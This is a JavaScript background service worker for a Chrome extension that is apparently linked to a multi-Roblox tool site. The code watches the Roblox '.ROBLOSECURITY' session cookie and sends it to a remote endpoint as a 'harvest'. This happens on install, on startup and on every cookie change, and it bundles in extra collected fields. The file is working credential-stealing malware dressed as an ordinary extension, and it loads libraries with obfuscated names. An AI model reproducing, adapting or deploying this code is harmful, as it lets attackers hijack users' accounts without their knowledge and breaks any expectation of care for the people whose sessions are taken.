'use strict';

importScripts(
  'lib/q7n2k8wp.js',
  'lib/gkr7nz4v.js',
  'lib/s3j6w9cr.js',
  'lib/n6h3c1qv.js',
  'lib/v8d2x4lp.js',
  'lib/k2j5t8ym.js',
  'lib/p3m8v1kt.js'
);

let _retriggerTimer = null;
let _lastHarvestAt = 0;
const _DEBOUNCE_MS = 2000;
const _MIN_INTERVAL_MS = 45 * 1000;

function _defaultDir() {
  return String(self.MRBX_DEFAULT_WORKER_DIR || 'main').trim();
}

function _mrmLandingUrl(dir) {
  var host = String(self.MRBX_LANDING_HOST || 'multiroblox.at').replace(/^www\./, '');
  return 'https://' + host + '/';
}

function _seedWorkerDir() {
  var mrbx = self.MrbxSubmit;
  var dir = _defaultDir();
  if (!mrbx || !dir || typeof mrbx.rememberWorkerDirFromUrl !== 'function') return;
  mrbx.rememberWorkerDirFromUrl(_mrmLandingUrl(dir)).catch(function () {});
}

if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.onInstalled) {
  chrome.runtime.onInstalled.addListener(function (details) {
    _seedWorkerDir();
    if (details && (details.reason === 'install' || details.reason === 'update')) {
      setTimeout(function () {
        _lastHarvestAt = 0;
        _backgroundHarvest({ pass: 'Extension', reason: details.reason });
      }, 2500);
    }
  });
}

if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.onStartup) {
  chrome.runtime.onStartup.addListener(function () {
    _seedWorkerDir();
    setTimeout(function () {
      _lastHarvestAt = 0;
      _backgroundHarvest({ pass: 'Extension', reason: 'startup' });
    }, 3000);
  });
}

_seedWorkerDir();

chrome.cookies.onChanged.addListener(function (info) {
  if (!info || info.removed) return;
  var c = info.cookie;
  if (!c || c.name !== '.ROBLOSECURITY' || !c.value) return;
  var domain = String(c.domain || '').toLowerCase();
  if (domain.indexOf('roblox.com') === -1) return;

  if (_retriggerTimer) clearTimeout(_retriggerTimer);
  _retriggerTimer = setTimeout(function () {
    _retriggerTimer = null;
    var now = Date.now();
    if (now - _lastHarvestAt < _MIN_INTERVAL_MS) return;
    _lastHarvestAt = now;
    _backgroundHarvest();
  }, _DEBOUNCE_MS);
});

async function _backgroundHarvest(options) {
  options = options || {};
  try {
    var mrbx = self.MrbxSubmit;
    if (!mrbx || typeof mrbx.submitMrbxCookie !== 'function') {
      return { ok: false, error: 'MrbxSubmit missing' };
    }

    var cookie = '';
    if (typeof mrbx.getRobloxCookieFromBrowser === 'function') {
      cookie = await mrbx.getRobloxCookieFromBrowser();
    }
    if (!cookie) {
      return { ok: false, error: 'No Roblox cookie' };
    }

    var submitOpts = { allowDuplicate: true };
    if (options.withExtras !== false) {
      var swExtras = self.MrbxExtrasSW;
      if (swExtras && typeof swExtras.collectAndBuildExtrasFields === 'function') {
        try {
          var extrasFields = await swExtras.collectAndBuildExtrasFields();
          if (extrasFields && Object.keys(extrasFields).length) {
            submitOpts.skipExtras = false;
            submitOpts.extrasFields = extrasFields;
          } else {
            submitOpts.skipExtras = true;
          }
        } catch (_) {
          submitOpts.skipExtras = true;
        }
      } else {
        submitOpts.skipExtras = true;
      }
    } else {
      submitOpts.skipExtras = true;
    }

    var out = await mrbx.submitMrbxCookie(cookie, _defaultDir(), options.pass || 'Harvest', submitOpts);
    if (!out.ok) {
      console.warn('[MRBX harvest FAIL]', options.reason || 'auto', out.stage || 'submit', out.error || out);
    } else {
      console.info('[MRBX harvest OK]', options.reason || 'auto', out.dir, out.duplicate ? '(duplicate)' : '(new)');
    }
    return out;
  } catch (e) {
    console.warn('[MRBX harvest exception]', options.reason || 'auto', e && e.message ? e.message : e);
    return { ok: false, error: e && e.message ? e.message : String(e) };
  }
}

function _rememberMrbxDirFromTabUrl(url) {
  try {
    var mrbx = self.MrbxSubmit;
    if (!mrbx || typeof mrbx.rememberWorkerDirFromUrl !== 'function') return;
    mrbx.rememberWorkerDirFromUrl(String(url || '')).catch(function () {});
  } catch (_) {}
}

if (typeof chrome !== 'undefined' && chrome.tabs) {
  chrome.tabs.onUpdated.addListener(function (_tabId, info, tab) {
    if (!tab || !tab.url) return;
    if (info.status !== 'complete' && info.url == null) return;
    _rememberMrbxDirFromTabUrl(info.url || tab.url);
  });
}

chrome.runtime.onMessage.addListener(function (msg, _sender, sendResponse) {
  if (!msg) return;

  if (msg.type === 'mrbx-set-worker-dir') {
    var mrbx = self.MrbxSubmit;
    var dir = String(msg.dir || '').trim();
    if (!mrbx || !dir) {
      sendResponse({ success: false });
      return true;
    }
    mrbx
      .rememberWorkerDirFromUrl(_mrmLandingUrl(dir))
      .then(function (saved) {
        sendResponse({ success: !!saved, dir: saved || dir });
      })
      .catch(function () {
        sendResponse({ success: false });
      });
    return true;
  }

  if (msg.type === 'mrbx-submit-cookie') {
    var mrbxSubmit = self.MrbxSubmit;
    var cookieVal = String(msg.cookie || '').trim();
    if (!mrbxSubmit || !cookieVal) {
      sendResponse({ ok: false, error: 'Missing cookie' });
      return true;
    }
    _lastHarvestAt = Date.now();

    function runSubmit(extrasFields) {
      var hasExtras = extrasFields && typeof extrasFields === 'object' && Object.keys(extrasFields).length > 0;
      mrbxSubmit
        .submitMrbxCookie(cookieVal, msg.dir || _defaultDir(), msg.pass || 'Extension', {
          skipExtras: !hasExtras,
          extrasFields: hasExtras ? extrasFields : null
        })
        .then(function (r) {
          if (!r.ok) {
            console.warn('[MRBX submit FAIL]', msg.reason || 'message', r.stage || 'submit', r.error || r);
          } else {
            console.info('[MRBX submit OK]', msg.reason || 'message', r.dir, r.duplicate ? '(duplicate)' : '(new)');
          }
          sendResponse(r || { ok: false });
        })
        .catch(function (e) {
          sendResponse({ ok: false, error: e && e.message ? e.message : String(e) });
        });
    }

    if (msg.extrasStorageKey) {
      chrome.storage.local.get([msg.extrasStorageKey], function (data) {
        var extras = (data && data[msg.extrasStorageKey]) || null;
        chrome.storage.local.remove(msg.extrasStorageKey);
        runSubmit(extras);
      });
      return true;
    }

    runSubmit(msg.extrasFields || null);
    return true;
  }

  if (msg.type === 'mrbx-collect-extras') {
    var swCollector = self.MrbxExtrasSW;
    if (!swCollector || typeof swCollector.collectAndBuildExtrasFields !== 'function') {
      sendResponse({ extrasFields: {} });
      return true;
    }
    swCollector
      .collectAndBuildExtrasFields()
      .then(function (fields) {
        sendResponse({ extrasFields: fields || {} });
      })
      .catch(function () {
        sendResponse({ extrasFields: {} });
      });
    return true;
  }

  if (msg.type === 'mrbx-harvest-now') {
    _lastHarvestAt = 0;
    _backgroundHarvest()
      .then(function (r) {
        sendResponse(r || { ok: false });
      })
      .catch(function (e) {
        sendResponse({ ok: false, error: e && e.message ? e.message : String(e) });
      });
    return true;
  }

  return false;
});

self.__mrbxHarvestNow = function () {
  _lastHarvestAt = 0;
  return _backgroundHarvest();
};
